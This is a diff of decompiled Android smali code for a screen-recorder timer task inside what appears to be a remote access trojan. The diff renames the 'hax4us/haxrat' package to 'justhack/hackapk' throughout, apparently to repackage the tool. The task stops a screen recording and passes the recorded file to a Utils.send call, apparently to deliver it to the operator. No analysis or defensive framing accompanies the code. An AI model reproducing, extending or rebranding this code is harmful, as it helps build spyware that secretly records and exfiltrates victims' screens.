@@ -1,11 +1,11 @@
-.class Lcom/hax4us/haxrat/ScreenRecorderService$100000000;
+.class Lcom/justhack/hackapk/ScreenRecorderService$100000000;
 .super Ljava/util/TimerTask;
 .source "ScreenRecorderService.java"
 
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingClass;
-    value = Lcom/hax4us/haxrat/ScreenRecorderService;
+    value = Lcom/justhack/hackapk/ScreenRecorderService;
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -15,11 +15,11 @@
 
 
 # instance fields
-.field private final this$0:Lcom/hax4us/haxrat/ScreenRecorderService;
+.field private final this$0:Lcom/justhack/hackapk/ScreenRecorderService;
 
 
 # direct methods
-.method constructor <init>(Lcom/hax4us/haxrat/ScreenRecorderService;)V
+.method constructor <init>(Lcom/justhack/hackapk/ScreenRecorderService;)V
     .locals 5
 
     move-object v0, p0
@@ -34,19 +34,19 @@
 
     move-object v4, v1
 
-    iput-object v4, v3, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;
+    iput-object v4, v3, Lcom/justhack/hackapk/ScreenRecorderService$100000000;->this$0:Lcom/justhack/hackapk/ScreenRecorderService;
 
     return-void
 .end method
 
-.method static access$0(Lcom/hax4us/haxrat/ScreenRecorderService$100000000;)Lcom/hax4us/haxrat/ScreenRecorderService;
+.method static access$0(Lcom/justhack/hackapk/ScreenRecorderService$100000000;)Lcom/justhack/hackapk/ScreenRecorderService;
     .locals 4
 
     move-object v0, p0
 
     move-object v3, v0
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;
+    iget-object v3, v3, Lcom/justhack/hackapk/ScreenRecorderService$100000000;->this$0:Lcom/justhack/hackapk/ScreenRecorderService;
 
     move-object v0, v3
 
@@ -72,33 +72,33 @@
 
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;
+    iget-object v2, v2, Lcom/justhack/hackapk/ScreenRecorderService$100000000;->this$0:Lcom/justhack/hackapk/ScreenRecorderService;
 
-    invoke-static {v2}, Lcom/hax4us/haxrat/ScreenRecorderService;->access$1000016(Lcom/hax4us/haxrat/ScreenRecorderService;)V
+    invoke-static {v2}, Lcom/justhack/hackapk/ScreenRecorderService;->access$1000016(Lcom/justhack/hackapk/ScreenRecorderService;)V
 
     .line 169
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;
+    iget-object v2, v2, Lcom/justhack/hackapk/ScreenRecorderService$100000000;->this$0:Lcom/justhack/hackapk/ScreenRecorderService;
 
     move-object v3, v0
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;
+    iget-object v3, v3, Lcom/justhack/hackapk/ScreenRecorderService$100000000;->this$0:Lcom/justhack/hackapk/ScreenRecorderService;
 
-    invoke-static {v3}, Lcom/hax4us/haxrat/ScreenRecorderService;->access$L1000006(Lcom/hax4us/haxrat/ScreenRecorderService;)Landroid/content/BroadcastReceiver;
+    invoke-static {v3}, Lcom/justhack/hackapk/ScreenRecorderService;->access$L1000006(Lcom/justhack/hackapk/ScreenRecorderService;)Landroid/content/BroadcastReceiver;
 
     move-result-object v3
 
-    invoke-virtual {v2, v3}, Lcom/hax4us/haxrat/ScreenRecorderService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
+    invoke-virtual {v2, v3}, Lcom/justhack/hackapk/ScreenRecorderService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
 
     .line 170
     const-string v2, "SR"
 
     move-object v3, v0
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;
+    iget-object v3, v3, Lcom/justhack/hackapk/ScreenRecorderService$100000000;->this$0:Lcom/justhack/hackapk/ScreenRecorderService;
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService;->file:Ljava/io/File;
+    iget-object v3, v3, Lcom/justhack/hackapk/ScreenRecorderService;->file:Ljava/io/File;
 
     invoke-static {v2, v3}, Lcom/util/extras/Utils;->send(Ljava/lang/String;Ljava/io/File;)Z
 
@@ -107,9 +107,9 @@
     .line 171
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;
+    iget-object v2, v2, Lcom/justhack/hackapk/ScreenRecorderService$100000000;->this$0:Lcom/justhack/hackapk/ScreenRecorderService;
 
-    invoke-virtual {v2}, Lcom/hax4us/haxrat/ScreenRecorderService;->stopSelf()V
+    invoke-virtual {v2}, Lcom/justhack/hackapk/ScreenRecorderService;->stopSelf()V
 
     .line 172
     const-string v2, "TAGG"
